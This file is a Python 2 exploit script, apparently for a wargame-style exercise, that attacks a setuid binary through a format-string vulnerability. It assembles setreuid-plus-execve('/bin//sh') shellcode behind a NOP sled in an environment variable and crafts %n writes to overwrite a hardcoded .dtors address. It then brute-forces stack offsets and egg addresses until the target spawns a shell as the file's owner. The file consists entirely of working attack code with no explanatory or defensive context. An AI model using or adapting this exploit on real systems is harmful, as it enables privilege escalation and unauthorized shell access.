#!/usr/bin/python

import sys
import os
import stat
import re

def x_bite_hex(str_num,size):
    num = hex(str_num).split("x")[1]

    while len(num) < size:
        num = '0' + num

    return num

def hex_to_string(num):
    res_str = ''

    pairs = re.findall("([0-9a-f]{2})",num,flags=re.IGNORECASE)

    for pair in pairs:
        res_str = chr(int(pair,16)) + res_str

    if res_str == '':
        return None
    else:
        return res_str    

def uid_to_string(x):
    if x is None or x <= 0:
        return None

    num = x_bite_hex(x,4)

    return hex_to_string(num)

def build_shellcode(uid):
    str_uid = uid_to_string(uid)

    shellcode =  "\x55"
    shellcode += "\x89\xe5"

    shellcode += "\x31\xc0"
    shellcode += "\x31\xdb"
    shellcode += "\x31\xc9"
    shellcode += "\xb0\x46"

    if str_uid is not None:
        shellcode += "\x66\xbb" + str_uid
        shellcode += "\x66\xb9" + str_uid

    shellcode += "\xcd\x80"
    
    shellcode += "\x31\xc0"
    shellcode += "\x50"
    shellcode += "\x68\x2f\x2f\x73\x68"
    shellcode += "\x68\x2f\x62\x69\x6e"
    shellcode += "\x89\xe3"
    shellcode += "\x31\xc9"
    shellcode += "\x31\xd2"
    shellcode += "\xb0\x0b"
    shellcode += "\xcd\x80"

    return shellcode

def set_eggshell(uid,eggsize):
    eggshell = build_shellcode(uid)
    eggshell = "\x90"*eggsize + eggshell
    os.environ['EGG'] = eggshell

def get_uid(path):
    try:
        st = os.stat(path)
    except:
        print "[-] The target " + path + " does not exist"
        exit(0)

    return st.st_uid

def build_formatstring(dtors,offset,egg):
    fs = ''

    addr = x_bite_hex(dtors,8)
    for i in range(4):
        fs += hex_to_string(addr)
        fs += hex_to_string(addr)
        fs += 'AAAA'
        addr = x_bite_hex(int(addr,16)+1,8)

    printed = len(fs)

    for i in range(offset):
        fs += "%08x"

    printed += offset*8

    egg_addr = x_bite_hex(egg,8)
    pairs = re.findall("([0-9a-f]{2})",egg_addr,flags=re.IGNORECASE)

    for pair in reversed(pairs):
        to_print = int(pair,16) + 0x100
        printed %= 0x100
        padding = (to_print - printed) % 0x100

        if padding < 10:
            padding += 0x100

        fs += "%0" + str(padding) + "u%n%08x"
        printed += padding + 8

    return fs

def set_payload(dtors,offset,egg):
    payload = build_formatstring(dtors,offset,egg)    
    os.environ['PAYLOAD'] = payload

def main():
    if len(sys.argv) < 2:
        print "[-] Usage: ./exploit5.py target"
        exit(0)

    target = sys.argv[1]
    print "[+] Exploit Target: " + target
    
    uid = get_uid(target)
    print "[+] Using UID " + str(uid)

    dtors = 0x080494d4
    print "[+] Using .dtors entry at " + hex(dtors)    

    set_eggshell(uid,0x1000)
    print "[+] Eggshell set to $EGG variable"

    for i in range(16):
        egg_addr = 0xbfff0000 + 0x1000*i  
        print "[+] Trying egg_addr = " + hex(egg_addr)
        for j in range(10):
            set_payload(dtors,j,egg_addr)
            ret =  os.system(target + " $PAYLOAD")
            ret >>= 8
            if ret != 0:
                print "[+] Exiting exploit"
                exit(0)

#    set_payload(dtors,5,0xbfffcff0)
#    print "[+] Payload set to $PAYLOAD variable"
#    os.system(target + " $PAYLOAD")
#    os.system('/bin/bash')

main()
